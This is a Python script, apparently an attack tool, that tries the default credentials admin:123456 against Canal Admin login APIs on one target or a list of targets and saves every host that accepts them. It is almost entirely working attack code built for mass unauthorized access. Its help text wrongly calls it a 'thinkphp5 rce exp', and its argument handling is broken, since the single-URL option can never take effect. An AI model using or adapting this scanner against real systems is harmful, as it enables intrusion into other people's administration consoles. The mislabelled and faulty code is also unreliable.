import argparse
import textwrap

import requests

requests.packages.urllib3.disable_warnings()


def main(url):
    full_url = f"{url}/api/v1/user/login"
    json = {"password": "123456", "username": "admin"}

    try:
        response = requests.post(full_url, json=json, allow_redirects=False, verify=False,
                                 timeout=5)
    except Exception:
        print(f'[-]{url}请求失败')
        return
    if response.status_code == 200 and '"code":20000' in response.text:
        print(f"[+]{url}登录成功")
        return url
    else:
        print(f"[-]{url}登录失败")


if __name__ == "__main__":
    banner = """ 
_________                      .__       _____       .___      .__        
\_   ___ \_____    ____ _____  |  |     /  _  \    __| _/_____ |__| ____  
/    \  \/\__  \  /    \\__  \ |  |    /  /_\  \  / __ |/     \|  |/    \ 
\     \____/ __ \|   |  \/ __ \|  |__ /    |    \/ /_/ |  Y Y  \  |   |  \
 \______  (____  /___|  (____  /____/ \____|__  /\____ |__|_|  /__|___|  /
        \/     \/     \/     \/               \/      \/     \/        \/ 
    """
    print(banner)
    parser = argparse.ArgumentParser(description='thinkphp5 rce exp',
                                     formatter_class=argparse.RawDescriptionHelpFormatter,
                                     epilog=textwrap.dedent('''example:
            Canal Admin.py -u http://192.168.1.108
            Canal Admin.py -f url.txt
            '''))
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.mhx.com")
    parser.add_argument("-f", "--file", dest="file", type=str, default="url.txt", help="-f url.txt")
    args = parser.parse_args()
    if args.file:
        res_url = []
        with open(f"{args.file}", mode="r", encoding="u8") as f:
            for line in f:
                url = main(line.strip())
                if url:
                    res_url.append(url)
        with open("result1.txt", mode="w", encoding="u8") as f:
            for i in res_url:
                f.write(f"{i}存在弱口令 admin:123456\n")
    else:
        main(args.url)
